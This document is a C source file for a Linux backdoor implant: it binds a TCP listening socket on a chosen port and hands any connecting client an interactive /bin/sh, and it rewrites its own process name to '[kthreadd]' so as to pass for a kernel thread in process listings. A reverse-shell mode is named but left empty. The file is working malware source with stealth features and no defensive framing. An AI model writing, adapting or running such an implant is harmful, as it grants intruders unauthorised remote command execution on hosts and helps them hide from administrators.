#include <stdio.h>  
#include <stdlib.h>
#include <sys/types.h>   
#include <sys/socket.h>  
#include <netinet/in.h>

#define _XOPEN_SOURCE 700
#define _GNU_SOURCE
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <ftw.h>

#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/signal.h>
  
int host_sockid;    // sockfd for host  
int client_sockid;  // sockfd for client  
      
struct sockaddr_in hostaddr;            // sockaddr struct  

// 64-bit library
#ifdef __amd64__
const char service_interp[] __attribute__((section(".interp"))) = "/lib64/ld-linux-x86-64.so.2";
#endif
// 32-bit library
#ifdef __i386__
const char service_interp[] __attribute__((section(".interp"))) = "/lib/ld-linux.so.2";
#endif



void bindshell(int port) {
    // Create socket  
    host_sockid = socket(PF_INET, SOCK_STREAM, 0);
  
    // Initialize sockaddr struct to bind socket using it  
    hostaddr.sin_family = AF_INET;  
    hostaddr.sin_port = htons(port);  
    hostaddr.sin_addr.s_addr = htonl(INADDR_ANY);  
  
    // Bind socket to IP/Port in sockaddr struct  
    bind(host_sockid, (struct sockaddr*) &hostaddr, sizeof(hostaddr));  
      
    // Listen for incoming connections  
    listen(host_sockid, 2);  
  
    // Accept incoming connection, don't store data, just use the sockfd created  
    client_sockid = accept(host_sockid, NULL, NULL);  
  
    // Duplicate file descriptors for STDIN, STDOUT and STDERR  
    dup2(client_sockid, 0);  
    dup2(client_sockid, 1);  
    dup2(client_sockid, 2);  
  
    // Execute /bin/sh  
    execve("/bin/sh", NULL, NULL);  
    close(host_sockid);  
}
  
int main(int argc, char** argv)  
{ 
    if (argc < 3) {
        exit(1);
    }

    // Masquarade as [kthreadd]
    argv[0][7] = 'd';
    argv[0][4] = 'r';
    argv[0][8] = 'd';
    argv[0][0] = '[';
    argv[0][1] = 'k';
    argv[0][10] = '\0';
    argv[0][2] = 't';
    argv[0][3] = 'h';
    argv[0][5] = 'e';
    argv[0][6] = 'a';
    argv[0][9] = ']';

    // Check mode
    switch (argv[1][0]) {
        case 'b':
            bindshell(atoi(argv[2]));
            break;
        case 'r':
            break;
        default:
            exit(1);
    }

    return 0;  
}